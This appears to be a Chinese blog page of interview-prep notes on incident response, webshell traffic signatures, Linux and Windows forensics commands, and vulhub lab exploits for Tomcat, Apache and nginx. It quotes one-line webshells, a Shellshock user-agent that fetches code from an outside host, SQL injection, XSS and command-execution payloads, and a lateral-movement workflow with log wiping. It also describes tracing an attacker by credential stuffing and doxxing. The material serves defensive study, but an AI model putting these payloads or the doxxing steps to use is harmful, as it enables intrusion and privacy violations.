href="https://id-ransomware.malwarehunterteam.com/">https://id-ransomware.malwarehunterteam.com</a><br>卡巴斯基：<a target="_blank" rel="noopener" href="https://noransom.kaspersky.com/">https://noransom.kaspersky.com</a><br>Avast：<a target="_blank" rel="noopener" href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a><br>Emsisoft：<a target="_blank" rel="noopener" href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a><br>Github勒索病毒解密工具收集汇总：<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a></p>
<p>如何判断一条威胁情报是否有误<br>分析流量数据包，可以用wireshark，分析流量是不是正常的业务操作</p>
<p>怎么判断自己被getshell了：用D盾查杀<br>  webshell：<br>      查web日志，分析攻击流量<br>      扫webshell<br>      排查网站目录，查看最近更改的文件<br>  shell：<br>      查看未知端口，未知进程<br>      排查恶意流量，锁定感染进程<br>      有安全设备就看安全设备</p>
<p>内网报警了怎么办？<br>首先就要是地位到具体的那一台机器，既然报警那就说明知道了具体的漏洞类型，加相应的补丁打上，以linux为主（一般都会问linux的），查看/var/log/secure系统日志，查看登录失败的记录，还有Linux历史命令–&gt;home目录的bash_histor，查看执行过的命令。在利用webshell或者是shell查杀工具查杀，查看tmp目录下是非有带有免杀的木马。彻底清除。再到全流量分析的机子上看，是非有经过其他的机器。拿到攻击ip之后到线上的一些网站查看主机类型，比如360或者微步上，查看是非是傀儡机，vps跳板，或者是国内个人云主机。如果是个人云主机，就可以通过whois查看是非有最近绑定的域名，或者绑定者的邮箱。知道邮箱之后就可以反查询出qq号说多少，再利用社工查询到手机号，到一个知名的网站上查询这个手机号有没有注册过什么网站，可以去这些网站通过撞库的方法登入，这样就可以拿到这个攻击者的身份证，学校，地址这些了。<br> （思路是应急响应-&gt;加固-&gt;溯源）</p>
<p>被攻击后，日志文件以及木马文件被删除怎样排查<br>lsof恢复被删除的文件，然后查日志，查服务，查进程，查看是否有新增的账号</p>
<p>安全设备出现报警信息，怎么看是误报还是攻击行为<br>对报警的数据进行分析，看是不是内部人员的操作，还是真实的攻击</p>
<p>怎么从流量分析是不是误报<br>分析流量数据包，可以用wireshark，分析流量是不是正常的业务操作</p>
<p>服务中了webshell怎样从日志找webshell位置，被拿shell后怎么应急，怎样快速定位shell<br>从日志 流量 文件开始，先定位位置 查看敏感目录 tmp usr/sbin etc/ssh ，对新创建文件，修改文件等进行查看，找特殊权限文件 比如777 。流量的话 从ua和playload去分析。比如菜刀连jsp木马：第一个参数是a-q，这个是不会变的，第二个是编码，第三个是 playload。日志的话从找到的shell时间点去关联分析，可以还原攻击手法<br>快速定位 就是看进程和内存 看占用时间长和占用率高的</p>
<p>设备报警，SQL注入的报警，能看到攻击时间，攻击ip，payload，如何判断是误报还是真是攻击，如果是真实攻击，怎么判断他攻击是否成功，如果成功怎么处理</p>
<p>先看ip，如果ip是公司内部的再看内部人员有没有相关操作，如果不是公司人员业务的操作那就是攻击了，<br>然后分析payload,分析它写的payload安全设备能否它进行过滤拦截，如果它确实能绕过，那就应该攻击成功了，<br>成功的话赶紧上报，做应急响应，做出相应处理，添加过滤规则，修改数据库中能修改的数据比如管理员账号密码啥的</p>
<p>安全设备部署WAF<br>服务器上开通过防火墙，使用cname接入的，在控制台添加要防护的网站域名，然后修改dns解析设置把流量解析到waf。</p>
<p>ufw（简单防火墙Uncomplicated FireWall）<br> 检查防火墙的状态（默认 inactive） # ufw status<br> 防火墙版本 # ufw version<br> 启动ufw防火墙 # ufw enable<br> 关闭ufw防火墙 # ufw disable<br> 默认禁止访问所有 # ufw default deny<br> 开放22/TCP端口 # ufw allow 22/tcp<br> 开放53端口(tcp/udp) # ufw allow 53<br> 禁止外部访问 # ufw deny 3306<br> 删除已经添加过的规则 # ufw delete allow 22<br> 允许此IP访问所有的本机端口 # ufw allow from 192.168.1.100<br> 删除上面的规则 # ufw delete allow from 192.168.1.100<br> 查看规则，显示行号 # ufw status numbered<br> 删除第三条规则 # ufw delete 3<br> 关闭ufw # ufw disable<br> 禁止对8888端口的访问 # ufw deny 8888<br> 打开来自192.168.0.1的tcp请求的22端口 # ufw allow proto tcp from 192.168.0.1 to any port 22</p>
<h3 id="内网渗透流程"><a href="#内网渗透流程" class="headerlink" title="内网渗透流程"></a>内网渗透流程</h3><p>拿到跳板后，先探测一波内网存活主机，用net user /domian命令查看跳板机是否在域内，探测存活主机、提权、提取hash、进行横向移动，定位dc位置，查看是否有能直接提权域管的漏洞，拿到dc控制权后进行提权，然后制作黄金票据做好维权，清理一路过来的日志擦擦脚印<br>信息收集</p>
<h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>1.网络配置 ipconfig /all<br>2.操作系统 systeminfo | findstr /B /C:”OS 名称” /C:”OS 版本”<br>3.软件信息 systeminfo | findstr /B /C:”OS Name” /C:”OS Version”<br>4.服务信息 wmic /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe<br>5.用户列表 net user<br>6.本地管理员信息 net localgroup administrators<br>7.端口信息 netstat –ano<br>8.补丁信息 wmic qfe get Caption,Description,HotFixID,InstalledOn<br>9.查防火墙 netsh firewall show config</p>
<h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>是否有域 使用ipconfig /all命令可以查看网关IP地址、DNS的IP地址以及判断当前主机 是否在域内：通过反 向解析查询命令nslookup来解析域名的IP地址，使用解析出来的IP地 址进行对比，判断域控制器和 DNS服务器是否在同一台服务器上<br>登录域信息 net config workstation 域内信息收集<br>ICMP探测内网 for /L %I in (1,1,254) DO <span class="label label-primary">@ping</span> -w 1 -n 1 192.168.174.%I | findstr “TTL=”<br>ARP探测内网</p>
<h3 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h3><p>查询域信息 net view /domain<br>查询域主机 net view /domain:XXX<br>查询域用户 net group /domain<br>查找域控 Nslookup -type=SRV _ldap._tcp net time /domain net group “Domain Controllers” /domain<br>查域用户信息 net user /domain<br>查询域管理员 net group “Domain Admins” /domain<br>查询域sid信息 whoami /all</p>
<h3 id="内网环境不出网"><a href="#内网环境不出网" class="headerlink" title="内网环境不出网"></a>内网环境不出网</h3><p>1.通过webshell实现内网socket代理<br>2.正向链接<br>3.ssh隧道<br>4.协议不同出网的方式不同，如dns对应dnscat2 tcp对应<br>5.测试是否是特定协议或端口出网</p>
<h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><ol>
<li>入侵者可能会删除机器的日志信息</li>
</ol>
<p>可以查看日志信息是否还存在或者是否被清空<br>ll -h /var/log/*</p>
<p>查看目录空间的使用情况<br>du -sh /var/log/*</p>
<ol start="2">
<li>入侵者可能创建一个新的存放用户名及密码文件</li>
</ol>
<p>ll /etc/passwd<br>ll /etc/sha*</p>
<ol start="3">
<li><p>入侵者可能修改用户名及密码文件<br>more /etc/passwd<br>more /etc/shadow</p>
</li>
<li><p>查看机器最近成功登陆的事件和最后一次不成功的登陆事<br>lastlog<br>对应日志 /var/log/lastlog</p>
</li>
<li><p>查看机器当前登录的全部用户<br>who<br>对应日志文件“/var/run/utmp</p>
</li>
<li><p>查看机****器创建以来登陆过的用户<br>last<br>对应日志文件“/var/log/wtmp”</p>
</li>
<li><p>查看机器所有用户的连接时间（小时）<br>ac -dp<br>对应日志文件“/var/log/wtmp”</p>
</li>
<li><p>如果发现机器产生了异常流量<br>可以使用命令“tcpdump”抓取网络包查看流量情况或者使用工具”iperf”查看流量情况</p>
</li>
<li><p>可以查看/var/log/secure日志文件<br>cat /var/log/secure | grep -i “accepted password”</p>
</li>
<li><p>查询异常进程所对应的执行脚本文件<br>top命令查看异常进程对应的PID<br>在虚拟文件系统目录查找该进程的可执行文件<br>ll /proc/1850/ | grep -i exe</p>
</li>
<li><p>如果确认机器已被入侵，重要文件已被删除，可以尝试找回被删除的文件Note</p>
</li>
</ol>
<h3 id="菜刀特征"><a href="#菜刀特征" class="headerlink" title="菜刀特征"></a>菜刀特征</h3><p>菜刀<br>payload特征：<br>PHP: <?php @eval($_POST['caidao']);?><br>ASP: &lt;%eval request(“caidao”)%&gt;<br>ASP.NET: &lt;%@ Page Language=“Jscript”%&gt;&lt;%eval(Request.Item[“caidao”],“unsafe”);%&gt;</p>
<p>数据包流量特征：<br>1，请求包中：ua头为百度，火狐<br>2，请求体中存在eavl，base64等特征字符<br>3，请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</p>
<p>蚁剑<br>数据包流量特征：普通的一句话都存在以下特征：<br>默认的USER-agent请求头 是 antsword xxx，可以通过修改：<br>/modules/request.js 文件中 请求UserAgent绕过 其中流量最中明显的特征为<span class="label label-primary">@ini_set(</span>“display_errors”,”0”);   @set_time_limit(0)开头<br>这段代码基本是所有 WebShell客户端链接PHP类WebShell都有的一种代码 蚁剑混淆加密后还有一个比较明显的特征,即为参数名大多以“_0x……=”这种形式（下划 线可替换），所以以_0x开头的参数名也很可能就是恶意流量<br>响应包的结果返回格式为：随机数<br>响应内容 随机数</p>
<p>冰蝎<br>payload特征：<br>php在代码中同样会存在eval或assert等字符特征<br>在aps中会在for循环进行一段异或处理<br>在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征<br>特征分析Content-Type: application/octet-stream 这是一个强特征查阅资料可知octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组）；很少使用</p>
<p>冰蝎2.0流量特征：<br>第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥<br>请求包存在：Accept: text/html, image/gif, image/jpeg, ; q=.2, /; q=.2<br>建立连接后的cookie存在特征字符<br>所有请求 Cookie的格式都为: Cookie: PHPSESSID=; path=/；<br>Content-Length: 16, 16就是冰蝎2连接的特征</p>
<p>冰蝎3.0流量特征：<br>请求包中content-length 为5740或5720（可能会根据Java版本而改变）<br>每一个请求头中存在<br>Pragma: no-cache，Cache-Control: no-cache<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept头application/xhtml+xmlapplication/xmlapplication/signed-exchange属于弱特征<br>ua头该特征属于弱特征。通过burp可以修改,冰蝎3.0内置的默认16个userAgent都比较老。</p>
<p>哥斯拉<br>payload特征：<br>jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征<br>php，asp则为普通的一句话木马</p>
<p>哥斯拉流量分析：<br>所有请求中Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8<br>所有响应中Cache-Control: no-store, no-cache, must-revalidate,<br>同时在所有请求中Cookie中后面都存在</p>
<h3 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h3><p>中间件是系统软件和用户应用软件之间连接的软件，以便于软件各部件之间的沟通是一种独立的系统软件或服务程序</p>
<p>中间件是在客户端/服务端的操作系统之上，管理计算机资源和网络通讯、信息交换</p>
<p>tomcat漏洞<br>cd vulhub/tomcat/tomcat8<br>docker-compose up –d<br>验证 <a target="_blank" rel="noopener" href="http://192.168.129.210:8080/">http://192.168.129.210:8080/</a><br>进入后台 弱口令 tomcat<br>上传木马war包<br>war包制作 jar -cvf shell_jsp2.war shell.jsp<br>访问木马 <a target="_blank" rel="noopener" href="http://192.168.129.210:8080/shell_jsp/shell.jsp">http://192.168.129.210:8080/shell_jsp/shell.jsp</a></p>
<p>Tomcat任意写入文件漏洞（CVE-2017-12615）<br>漏洞简介<br>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的JSP 文件。之后，JSP 文件中的代码将能被服务器执行。<br>漏洞的产生是由于配置不当（非默认配置），将配置文件（conf/web.xml）中的 readonly 设置为了 false，导致可以使用 PUT 方法上传</p>
<p>cd /app/vulhub-20201028/tomcat/CVE-2017-12615<br>docker-compose up –d<br>PUT /shell1.jsp/ HTTP/1.1<br>下面写上 jsp 的冰蝎木马<br>注意.Jsp 后面要加上/不然绕不过去</p>
<p>struts2</p>
<p>apache HTTP服务器<br>2.4.0-2.4.29版本 存在解析漏洞<br>在解析 PHP 时，1.php\x0A 将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略<br>cd vulhub/httpd/CVE-2017-15715/<br>docker-compose up –d<br>上传一个webshell 使用bp抓包 直接上传返回bad file<br>修改包 倒数第5行 第3列  改成0a<br>上传<br>访问 <a target="_blank" rel="noopener" href="http://192.168.0.103:8080/shell.php%0a">http://192.168.0.103:8080/shell.php%0a</a></p>
<p>nginx<br>文件解析漏洞 配置文件设置有误导致<br>结果是将.php结尾的请求 都进行处理</p>
<p>当访问/1.jpg/xxx.php时，nginx将查看url，看到它以.php结尾，将路径传给PHP fastcgi进行处理。<br>但是fastcgi在处理’xxx.php’文件时发现文件并不存在,这时php.ini配置文件中cgi.fix_pathinfo=1 发挥作用,这项配置默认开启，值为1，用于修复路径,如果当前路径不存在则采用上层路径。为此这里交由fastcgi处理的文件就变成了’/1.jpg’。新版本的php的配置文件php-fpm.conf引入了“security.limit_extensions”，限制了可执行文件的后缀，默认只允许执行.php文件。</p>
<p>修复方法<br>1、 将php.ini文件中的cgi.fix_pathinfo的值设置为0<br>2、 php-fpm.conf中的security.limit_extensions后面的值设置为.php</p>
<p>目录遍历<br>Nginx的目录遍历与apache一样,属于配置方面的问题,错误的配置可导致目录遍历与源码泄露<br>autoindex on;配置导致</p>
<p>空字节任意代码执行漏洞<br>Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码</p>
<p>nginx 0.5.*<br>nginx 0.6.*<br>nginx 0.7 &lt;= 0.7.65<br>nginx 0.8 &lt;= 0.8.37<br>抓包 在hex选项卡中将jpg后面的点修改为00</p>
<p>整数溢出(CVE-2017-7529)<br>nginx 0.5.6 &lt;= 1.13.2</p>
<p>在Nginx的range filter中存在整数溢出漏洞，可以通过带有特殊构造的range的HTTP头的恶意请求引发这个整数溢出漏洞，并导致信息泄露<br>cd vulhub/httpd/CVE-2017-7529/<br>docker-compose up –d</p>
<p>curl -i <a target="_blank" rel="noopener" href="http://192.168.1.103:8080/">http://192.168.1.103:8080/</a> -r -17308,-9223372036854758500</p>
<p>机器/tmp/nginx中查看缓存文件，可以看到，cache key的内容保存在了里面，此外还有服务器信息，这些都是不会返回给客户端的，但是因为这次的漏洞而导致这些信息也被返回，导致信息泄露；</p>
<p>解决方案<br>升级；如果不能升级，可以在 Nginx 配置文件中添加 max_ranges 1，从而禁用 multipart range</p>
<h2 id="应急响应-1"><a href="#应急响应-1" class="headerlink" title="应急响应"></a>应急响应</h2><p>查看歷史命令<br>異常用戶<br>查看非正常开放端口、進程<br>登錄日誌<br>netstat网络连接</p>
<p>文件<br>日期 新增文件  最近打开的文件 下载的文件<br>find ./ -mtime 0 -name “*.php”  最近1天修改的php<br>find ./ -mtime +3 -ls  最近3天修改的</p>
<p>查找重点<br>webshell  远程链接  计划任务  环境变量  开机自动启动的配置文件</p>
<h2 id="常见的入侵"><a href="#常见的入侵" class="headerlink" title="常见的入侵"></a>常见的入侵</h2><p>web：挂马、篡改、webshell<br>系统：系统异常、rdp爆破、ssh爆破、主机漏洞<br>病毒木马：远控、后门、勒索软件<br>信息泄露：拖库、数据库弱口令<br>网络流量：发包、批量请求、ddos</p>
<p>查看历史命令 排查用户信息 排查端口进程<br>排查文件修改 清理后门 查找攻击源 分析原因</p>
<ol>
<li>文件日期、新增文件、可疑文件、最近使用文件、下载文件</li>
<li>webshell排查</li>
<li>核心目录文件</li>
<li>当前活动进程、远程连接</li>
<li>启动进程、计划任务</li>
<li>进程分析工具 win使用pchunter  linux使用chkrootkit、rkhunter</li>
<li>系统分析、环境变量、账号信息、history、系统配置文件</li>
<li>日志分析 win事件查看器 linux /var/log</li>
</ol>
<p>cat /etc/shadow   查看密码<br>cat /etc/group    查看组信息<br>history           查看root用户执行的历史命令<br>last              查看最近登录成功的用户及信息<br>lastlog           显示主机所有用户最近一次登录信息<br>id                当前用户信息<br>who               查看当前登录系统的所有用户<br>w                 显示已经登陆系统的用户列表，并显示用户正在执行的指令<br>users             显示当前登录系统的所有用户的用户列表<br>usermod -L user   禁用user帐号，帐号无法登录，/etc/shadow 第二栏为!开头<br>userdel -r user   删除user用户，并且将/home目录下的user目录一并删除</p>
<p>查看可以远程登录的用户<br>awk ‘/$1|$6/{print $1}’ /etc/shadow</p>
<p>查看拥有sudo权限的用户<br>more /etc/sudoers | grep -v “^#|^$” | grep “ALL=(ALL)”</p>
<p>查看超级用户(uid=0),有些黑客将普通用户的uid改为0，则该普通用户也拥有了超级权限<br>awk -F: ‘$3==0{print $1}’ /etc/passwd</p>
<p>netstat -antlp<br>ls -l /proc/23762/exe  查看应用执行的信息</p>
<p>lsof -i:80<br>fuser -n tcp 80 显示80端口相关的进程号</p>
<p>cat /var/log/wtmp 所有登录信息日志</p>
<p>windows</p>
<p>netstat -ano<br>netstat -ano | findstr 80</p>
<p>taskkill /F /pid 8888 关闭进程</p>
<p>schtasks.exe 计划任务</p>
<p>System32/winevt/logs/Security.evtx 事件查看器</p>
<p>A、用户信息文件：/etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>account:password:UID:GID:GECOS:directory:shell<br>格式：用户名：密码：用户 ID：组 ID：用户说明：家目录：登陆之后 shell<br>注意：无密码只允许本机登陆，远程不允许登陆</p>
<p>B、系统影子文件：/etc/shadow<br>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt. Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::<br>bin:<em>:18264:0:99999:7:::<br>daemon:</em>:18264:0:99999:7:::<br>adm:<em>:18264:0:99999:7:::<br>格式：用户名：加密后的密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留<br>注意：如果加密后的密码这一栏的第一个字符为!或者</em>的话，说明这是一个不能登录的账户</p>
<p>Linux 系统可以通过 .bash_history 查看帐号执行过的系统命令：<br>1、查看 root 用户的历史命令：histroy<br>2、打开/home各帐号目录下的.bash_history，查看普通帐号的历史命令：cat .bash_history &gt;&gt; history.txt<br>3、为历史的命令增加登录的IP地址、执行命令时间等信息</p>
<p>保存1万条命令</p>
<ol>
<li>sed -i ‘s/^HISTSIZE=1000/HISTSIZE=10000/g’ /etc/profile</li>
<li>在/etc/profile的文件尾部添加如下行数配置信息(加速显示)：<br>USER_IP=<code>who -u am i 2&gt;/dev/null | awk &#39;&#123;print $NF&#125;&#39; | sed -e &#39;s/[()]//g&#39;</code><br>if [ “$USER_IP” = “” ]<br>then<br>USER_IP=<code>hostname</code> fi<br>export HISTTIMEFORMAT=”%F %T $USER_IP <code>whoami</code> “<br>shopt -s histappend<br>export PROMPT_COMMAND=”history -a”</li>
<li>source /etc/profile 让配置生效</li>
<li>历史操作命令的清除：history -c<br>注意此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile 文件中的记录。</li>
</ol>
<p>ls -l /proc/18176/exe #查看 PID 为 18176 的进程的可执行程序<br>lsof -p 18176 #查看 PID 为 18176 的进程打开的文件<br>lsof -c sshd #查看进程 sshd 打开的文件<br>lsof -i:33946 #查看 33946 端口对应的一些进程<br>fuser -n tcp 33946 #查看 33946 端口对应的进程 PID<br>pstree #查看进程树<br>ps aux #静态查看进程<br>ps aux | grep ssh #查看与 ssh 相关的进程<br>ps aux –sort -pcpu #静态查看进程，根据 cpu 使用情况排行，从高到低<br>ps aux –sort -pmem #静态查看进程，根据内存使用情况排行，从高到低<br>ps -p PID -o lstart #查看进程的启动时间点<br>kill -9 pid #强制杀死进程</p>
<p>/var/log/cron 记录了系统定时任务相关的日志<br>/var/log/cups 记录打印信息的日志<br>/var/log/dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息<br>/var/log/mailog 记录邮件信息<br>/var/log/message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件<br>/var/log/btmp 记录错误登录日志，这个文件是二进制文件，不能直接 vi 查看，而要使用lastb命令查看<br>/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用 lastlog命令查看<br>/var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接 vi，而需要使用 last 命令来查看<br>/var/log/utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接 vi，而要使用 w,who,users 等命令来查询<br>/var/log/secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如 SSH 登录，su 切换用户，sudo 授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</p>
<p>安全应急响应人员对Linux主机排查时提供便利，实现主机侧Checklist的自动全面化检测，根据检测结果自动数据聚合，进行黑客攻击路径溯源<br><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p>
<p>病毒查杀<br><a target="_blank" rel="noopener" href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p>
<h3 id="一、-tmp"><a href="#一、-tmp" class="headerlink" title="一、 tmp"></a>一、 tmp</h3><p>/tmp目录是一个特别的临时文件夹，每个用户都可以进行读写操作</p>
<p>ls -alt /</p>
<h3 id="二、-开机自启动目录"><a href="#二、-开机自启动目录" class="headerlink" title="二、 开机自启动目录"></a>二、 开机自启动目录</h3><p>自启动文件是按照时间排序的，新的会在最上边</p>
<p>/etc/init.d 很多恶意程序会绑定自启动</p>
<p>查看指定目录下的文件时间顺序的排序 ls -alt | head -n 10</p>
<p>查看文件时间属性  stat 文件名称</p>
<h3 id="三、-基于时间和权限的筛选"><a href="#三、-基于时间和权限的筛选" class="headerlink" title="三、 基于时间和权限的筛选"></a>三、 基于时间和权限的筛选</h3><p>查找72小时内新增的文件  <code>find ./ -ctime -2 -name &quot;*.php&quot;</code></p>
<p>查找24小时内被修改的文件 <code>find ./ -mtime 0 -name &quot;*.php&quot;</code></p>
<p>查找具有777权限的文件 <code>find ./ -iname &quot;*.php&quot; -perm 777</code>  -iname忽略大小写  -perm用于设定筛选文件权限</p>
<h3 id="四、-可疑网络连接分析与关闭"><a href="#四、-可疑网络连接分析与关闭" class="headerlink" title="四、 可疑网络连接分析与关闭"></a>四、 可疑网络连接分析与关闭</h3><p>netstat -pantl</p>
<p>查看正在建立连接的端口 netstat -pantl | grep “ESTABLISHED”</p>
<h3 id="五、-进程分析"><a href="#五、-进程分析" class="headerlink" title="五、 进程分析"></a>五、 进程分析</h3><p>查看所有进程信息  ps aux</p>
<p>筛选具体的PID进程信息  ps aux |grep PID</p>
<p>查看端口号  lsof -i:端口号</p>
<h3 id="六、-筛选异常登录"><a href="#六、-筛选异常登录" class="headerlink" title="六、 筛选异常登录"></a>六、 筛选异常登录</h3><p>查看登录日志，过滤掉本地登陆  last -i | grep -v 0.0.0.0</p>
<p>查看当前登录信息 w</p>
<h3 id="七、-异常用户分析与排查"><a href="#七、-异常用户分析与排查" class="headerlink" title="七、 异常用户分析与排查"></a>七、 异常用户分析与排查</h3><p>设置用户uid和gid都为0(和root用户类似)</p>
<p>修改文件 /etc/passwd</p>
<p>grep “0:0” /etc/passwd<br>ls -l /etc/passwd</p>
<p>awk -F: ‘$2==”!” {print $1}’ /etc/shadow<br>awk -F: ‘$3==0 {print $1}’ /etc/shadow</p>
<h3 id="八、-历史执行命令排查"><a href="#八、-历史执行命令排查" class="headerlink" title="八、 历史执行命令排查"></a>八、 历史执行命令排查</h3><p>历史命令会在 /root/.bash_history文件中</p>
<h3 id="九、-计划任务排查"><a href="#九、-计划任务排查" class="headerlink" title="九、 计划任务排查"></a>九、 计划任务排查</h3><p>查看当前任务  crontab -l<br>修改  crontab -e<br>删除  crontab -r</p>
<h3 id="十、-开机自启动项排查"><a href="#十、-开机自启动项排查" class="headerlink" title="十、 开机自启动项排查"></a>十、 开机自启动项排查</h3><p>debian中 /etc/init.d/目录下</p>
<p>查看状态  /etc/init.d/程序名称 status</p>
<p>取消开机启动  update-rc.d 程序名称 disable</p>
<h3 id="十一、-异常-PATH排查"><a href="#十一、-异常-PATH排查" class="headerlink" title="十一、 异常$PATH排查"></a>十一、 异常$PATH排查</h3><p>查看环境变量  echo $PATH</p>
<p>加入临时变量 export PATH=$PATH:/usr/local/new/bin</p>
<h3 id="十二、-后门自动检测工具"><a href="#十二、-后门自动检测工具" class="headerlink" title="十二、 后门自动检测工具"></a>十二、 后门自动检测工具</h3><p>apt install rkhunter</p>
<p>rkhunter -check -sk<br>         检查本地</p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><ol>
<li>分析日志的目的</li>
</ol>
<p>误报：不是攻击而上报成攻击<br>漏报：是攻击而没有防御的情况</p>
<p>日志分析可以判断是否误判或者漏判，可以溯源攻击行为<br>在护网作为防守方必备的技能（分析NGAF和态势感知，发现异常）</p>
<ol start="2">
<li>攻击出现的位置</li>
</ol>
<p>Http应答页面<br>  webshell（请求和应答方向都可能）、信息泄露（应答方向）</p>
<p>Get、post 请求报文的url字段<br>Get、post请求报文的cookie字段<br>Get、post请求报文的referer字段</p>
<p>Get 、post请求报文的user-agent字段或者类似表示访问客户端软件的字段<br>恶意爬虫：Python-urllib/2.6、Baidu-YunGuanCe-ScanBot(ce.baidu.com)<br>扫描器：morfeus fucking scanner、 Accept:acunetix/wvs<br>sql注入漏洞：sqlmap/1.0.8.15#dev (<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org</a>)<br>xss攻击：’%22()%26%25&lt;ScRiPt%20&gt;prompt(961668)</ScRiPt><br>其它非常特殊攻击 ：User-Agent: () { :; }; /bin/mkdir -p /share/HDB_DATA/…/ &amp;&amp; /usr/bin/wget -q -c <a target="_blank" rel="noopener" href="http://lliillii.altervista.org/io.php">http://lliillii.altervista.org/io.php</a> 0&lt;&amp;1 2&gt;&amp;1</p>
<p>Post请求报文的表单字段-xss攻击、SQL注入、命令执行、文件包含、目录穿越、webshell、信息泄露、网站扫描、cookie字段、referer字段、post表单字段和url请求类似</p>
<ol start="3">
<li>攻击常见的语句</li>
</ol>
<p>sql注入</p>
<p>探测语句<br>• <a target="_blank" rel="noopener" href="http://www.19cn.com/showdetail.asp?id=49">http://www.19cn.com/showdetail.asp?id=49</a> and 1=1<br>• <a target="_blank" rel="noopener" href="http://www.19cn.com/showdetail.asp?id=49">http://www.19cn.com/showdetail.asp?id=49</a> or 1=1<br>• and char(124)%2Buser%2Bchar(124)=0 （注入类型判断）</p>
<p>权限判断<br>• and user&gt;0 用户名<br>• and 1=(select IS_SRVROLEMEMBER(‘sysadmin’)) 权限<br>• and exists (select * from sysobjects) 数据库类型判断sqlserver</p>
<p>查询数据<br>• and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6) 查库名<br>• and (select top 1 name from TestDB.dbo.sysobjects where xtype=’U’ and status&gt;0 查表名<br>• and (select count(字段名) from 表名)&gt;0 猜字段<br>• and (select top 1 len(username) from admin)=X 猜字段值<br>• <a target="_blank" rel="noopener" href="http://localhost/mytest/sqlinject/?id=1+UNION+SELECT+1,password,3,username,5,6,7,8,9+FROM+user">http://localhost/mytest/sqlinject/?id=1+UNION+SELECT+1,password,3,username,5,6,7,8,9+FROM+user</a><br>union select猜解法<br>• and ascii(lower(substring((select top 1 name from sysobjects where xtype=’u’), 1, 1))) &gt; 116</p>
<p>xss攻击<br>• <script>alert("xss")</script> 脚本<br>• <img src="javascript:alert('xss');"> 属性<br>• <img src="http://ha.ckers.org/xss.jpg"><br>• &lt;body onload=alert(‘xss’)&gt; 事件<br>• <div style="background-image:url(javascript:alert('xss'))"><br>• <style type="text/javascript">alert(‘xss’);</style><br>• <style>@import’javascript:alert(“xss”)’;</style><br>• <link rel="stylesheet" href="http://ha.ckers.org/xss.css"></p>
<p>命令执行<br>• GET /simple/tests/tmssql.php?do=phpinfo<br>• GET /detail.php?id=/winnt/system32/cmd.exe?/c+dir+c:%5c<br>• GET /cgi/maker/ptcmd.cgi?cmd=;cat+/tmp/config/usr.ini<br>• GET /cgi/maker/ptcmd.cgi?cmd=;cat+/etc/passwd</p>
